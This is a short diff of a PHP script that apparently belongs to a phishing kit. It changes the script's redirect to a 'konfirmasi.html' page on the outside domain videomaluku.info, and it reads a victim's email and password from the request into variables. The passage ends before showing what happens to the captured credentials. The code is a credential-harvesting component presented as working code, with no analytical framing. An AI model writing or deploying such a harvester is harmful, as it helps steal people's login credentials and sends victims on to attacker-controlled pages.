@@ -1,5 +1,5 @@
 <?php
-header("Location:konfirmasi.html");
+header("Location: https://videomaluku.info/konfirmasi.html");
 $ADEx = "rejeki.999";
 $ADEy = $_GET['email'];
 $ADEz = $_GET['pass'];
